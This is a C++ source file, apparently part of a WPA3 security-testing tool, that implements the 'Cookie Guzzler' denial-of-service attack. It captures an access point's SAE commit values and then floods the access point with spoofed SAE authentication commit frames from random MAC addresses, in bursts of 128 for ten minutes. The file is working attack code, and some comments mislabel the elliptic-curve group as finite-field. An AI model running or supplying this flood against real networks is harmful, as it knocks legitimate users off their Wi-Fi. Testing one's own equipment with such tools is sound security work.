#include "attacks/DoS_hard/cookie_guzzler/cookie_guzzler.h"

#include <tins/tins.h>
#include <string>
#include <random>

#include "attacks/DoS_hard/cookie_guzzler/capture_commit_values.h"
#include "config/RunStatus.h"
#include "logger/log.h"
#include "system/hw_capabilities.h"

using namespace std;
using namespace Tins;
using namespace chrono;

namespace wpa3_tester::cookie_guzzler{
    RadioTap get_cookie_guzzler_frame(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, const SAEPair &sae_params){

        // Build the 802.11 Auth frame
        Dot11Authentication auth;
        auth.addr1(ap_mac);  // destination (BSSID)
        auth.addr2(sta_mac); // spoofed source
        auth.addr3(ap_mac);  // BSSID
        auth.type(Dot11::MANAGEMENT);
        auth.subtype(Dot11::AUTH);

        auth.auth_algorithm(3);  // algo=3  (SAE)
        auth.auth_seq_number(1); // commit
        auth.status_code(0);

        // Build SAE commit frame with proper FFC format
        vector<uint8_t> current_payload;

        current_payload.push_back(0x13);
        current_payload.push_back(0x00);  // Group: 19 (finite field cyclic group)
        
        for (size_t i = 0; i < 32 && i < sae_params.scalar.size(); ++i) {
            current_payload.push_back(sae_params.scalar[i]);
        }

        for (size_t i = 0; i < 64 && i < sae_params.element.size(); ++i) {
            current_payload.push_back(sae_params.element[i]);
        }

        const RawPDU raw_data(current_payload);
        auth.inner_pdu(raw_data);

        RadioTap radiotap;
        radiotap.inner_pdu(auth);
        return radiotap;
    }

    void check_vuln(const string &iface_name,const HWAddress<6> &ap_mac, const int attack_time, const SAEPair &sae_params){

        PacketSender sender(iface_name);

        long long counter       = 0;
        long long next_log      = 2000;

        const auto end_time = steady_clock::now() + seconds(attack_time);
        while (steady_clock::now() < end_time) {
            const string sta_mac = hw_capabilities::rand_mac();
            auto cg_frame = get_cookie_guzzler_frame(ap_mac, sta_mac, sae_params);

            //  burst of packet
            constexpr size_t BURST_SIZE = 128;
            for (size_t i = 0; i < BURST_SIZE; ++i) {sender.send(cg_frame);}
            counter += 128;

            if (counter >= next_log) {
                log(LogLevel::DEBUG, "Packets sent: "+to_string(counter));
                next_log += 2000;
            }
        }
        log(LogLevel::INFO, "Done. Total packets sent: "+to_string(counter));
    }

    void run_attack(RunStatus &rs){
        const ActorPtr ap = rs.get_actor("access_point");
        auto ssid = rs.config.at("actors").at("access_point").at("setup").at("program_config").at("ssid").get<string>();
        const ActorPtr attacker = rs.get_actor("attacker");

        //TODO timeout from attack config
        const SAEPair sae_params = get_commit_values(attacker["sniff_iface"], ssid, ap["mac"], 30);
        if (sae_params.success) {
            log(LogLevel::INFO, "SAE Commit captured");
            const HWAddress<6> ap_mac(ap["mac"]);
            check_vuln(attacker["iface"], ap_mac, 600, sae_params);
        } else {
            log(LogLevel::ERROR, "SAE Commit capture failed");
        }
    }
}